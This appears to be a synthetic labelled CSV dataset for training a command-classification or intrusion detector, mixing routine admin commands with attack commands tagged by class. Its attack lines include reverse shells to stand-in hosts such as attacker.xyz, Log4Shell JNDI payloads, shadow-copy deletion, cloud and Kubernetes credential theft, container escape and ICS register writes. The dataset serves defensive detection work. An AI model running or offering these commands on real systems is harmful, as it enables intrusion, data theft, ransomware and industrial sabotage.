timestamp,src_ip,input,label
2026-01-20T17:46:38.715600,40.16.100.13,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.698355,47.35.104.35,git pull,Normal_Business_Ops
2026-01-20T17:46:38.688752,145.39.71.9,git add .,Normal_Business_Ops
2026-01-20T17:46:38.753424,137.169.31.28,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.717597,37.4.11.82,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.753424,178.14.34.31,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.691848,70.245.138.241,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.699355,22.121.108.68,df -h,Normal_Business_Ops
2026-01-20T17:46:38.730167,41.13.80.97,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.721658,165.103.10.77,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.745361,177.217.34.214,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.688752,95.49.21.239,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.709422,133.225.164.254,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.713423,71.116.229.108,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.713423,2.103.186.4,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.737706,46.72.127.40,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.702379,122.213.125.208,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.749363,185.174.113.73,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.726165,48.20.74.126,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.750363,106.117.217.133,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.713423,147.220.61.82,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.749363,190.147.126.253,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.751920,147.193.146.42,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.688752,32.131.216.3,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.689753,5.60.43.197,npm start,Normal_Business_Ops
2026-01-20T17:46:38.702379,108.190.29.29,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.697356,117.79.106.43,git branch,Normal_Business_Ops
2026-01-20T17:46:38.727166,113.71.189.69,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.746362,116.6.97.49,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.734167,130.115.98.64,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.737706,203.81.73.124,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.688752,196.112.41.220,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.743361,19.106.31.64,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.690256,102.172.140.180,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.701356,118.143.243.218,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.726165,59.100.138.240,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.702379,159.220.39.204,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.702379,88.233.73.77,df -h,Normal_Business_Ops
2026-01-20T17:46:38.714423,66.105.229.230,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.701356,104.27.110.209,npm start,Normal_Business_Ops
2026-01-20T17:46:38.735167,58.60.209.12,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.754419,123.217.99.86,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.739701,182.255.26.185,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.708422,212.210.75.161,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.755771,220.159.72.237,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.693354,128.89.25.173,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.731167,12.223.115.1,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.695355,212.112.79.31,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.708422,34.255.92.29,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.713423,194.77.242.71,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,53.127.240.106,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.700357,95.46.235.1,make build,Normal_Business_Ops
2026-01-20T17:46:38.691257,193.39.196.162,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.696355,34.225.77.211,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.745361,24.81.180.228,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.722168,86.76.55.140,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.755771,11.204.127.150,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.712423,54.217.12.93,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.712423,26.192.93.126,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.740386,111.225.36.76,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.694354,11.233.157.148,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.719650,113.223.173.87,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.700357,131.45.175.45,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.732168,43.80.54.157,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.746362,157.220.230.240,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.714423,28.59.224.195,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.743361,74.137.32.100,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.749363,74.215.134.229,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.707425,148.169.102.26,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.753424,108.228.124.29,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.719650,95.141.236.183,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,14.206.176.242,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.724165,85.213.235.16,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.703359,88.231.65.24,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.693354,149.73.75.63,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.752911,68.57.200.96,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.688752,68.21.88.111,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.733168,191.82.28.124,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.751920,222.124.200.210,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.695355,163.147.103.245,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.751920,177.31.116.176,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.707418,214.59.241.152,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.747362,218.114.70.215,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.701356,116.21.21.216,make build,Normal_Business_Ops
2026-01-20T17:46:38.731167,11.147.228.103,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.707462,46.233.216.106,df -h,Normal_Business_Ops
2026-01-20T17:46:38.694354,3.71.65.195,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.725166,115.26.163.135,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.728166,45.247.228.194,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.737706,60.200.103.243,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.693354,162.2.27.65,git pull,Normal_Business_Ops
2026-01-20T17:46:38.731167,179.52.142.174,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.751385,19.95.242.139,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.743361,76.174.65.79,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.729167,132.59.130.164,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.693354,158.243.12.106,whoami,Normal_Business_Ops
2026-01-20T17:46:38.715600,104.205.212.176,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.702379,134.41.231.78,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.748407,64.141.112.5,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.705366,147.71.109.176,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.726165,110.112.189.24,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.742361,185.73.184.96,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.733168,163.118.38.34,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.754419,177.93.28.47,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.693354,102.190.13.80,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.734167,158.152.141.60,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.711422,18.144.191.99,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.729167,13.13.8.96,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.743361,137.233.126.202,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.749363,219.191.228.31,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.746362,58.146.197.228,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.741361,144.60.24.70,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.696355,165.183.227.115,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.700357,222.141.89.5,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.754419,99.241.174.37,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.732168,86.221.234.122,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,159.21.22.144,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.709422,101.128.28.168,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.693354,24.106.82.23,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.686752,160.169.49.197,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.707462,181.175.56.235,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.729167,2.135.76.67,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.719650,114.220.156.196,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.703359,62.177.34.5,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.685785,55.164.77.209,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.704359,122.182.212.167,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.747362,31.175.126.34,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.725166,21.67.201.125,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.684749,61.98.166.14,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.749363,6.146.222.134,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.725166,34.131.201.25,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.689753,96.46.102.225,git branch,Normal_Business_Ops
2026-01-20T17:46:38.716597,45.232.93.227,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.708422,45.202.243.119,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,169.102.115.248,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.689753,39.115.52.136,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.693354,29.253.35.40,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.701356,218.241.222.108,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.719650,104.19.199.70,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.742361,47.92.186.118,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.693354,37.118.57.143,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.731167,117.83.159.84,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.721658,181.203.143.11,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.752911,178.237.28.233,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.715600,210.136.228.199,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,58.156.154.148,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.708422,211.69.188.21,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.753424,109.79.123.239,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.749363,187.93.231.74,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.707462,145.221.176.72,make build,Normal_Business_Ops
2026-01-20T17:46:38.709422,160.219.245.69,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.744361,45.191.10.188,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.744361,168.195.255.1,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.725166,121.146.107.235,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,103.91.77.22,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.684749,99.91.142.158,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.729167,99.237.247.94,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.752911,134.142.95.210,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.699355,122.50.239.239,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.690278,129.41.73.105,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.713423,7.173.210.164,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.734167,107.109.53.201,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.699355,164.76.30.131,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.710422,108.131.201.113,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.754419,192.14.5.142,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.689753,15.66.215.41,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.693354,89.148.214.113,git add .,Normal_Business_Ops
2026-01-20T17:46:38.714423,215.136.140.241,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.714423,50.213.67.103,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.710422,8.31.19.31,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.726165,75.26.39.139,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.711422,133.158.200.96,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.700357,8.15.144.108,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.685785,102.114.73.28,whoami,Normal_Business_Ops
2026-01-20T17:46:38.694354,113.177.211.100,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.700357,124.17.226.166,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.701356,106.106.246.242,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.729167,29.105.2.217,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.713423,65.4.231.247,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.685785,118.59.199.10,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.700357,149.234.47.164,npm start,Normal_Business_Ops
2026-01-20T17:46:38.714423,219.66.107.110,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.737706,94.184.103.204,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.740386,152.75.164.41,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.754419,63.146.27.186,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
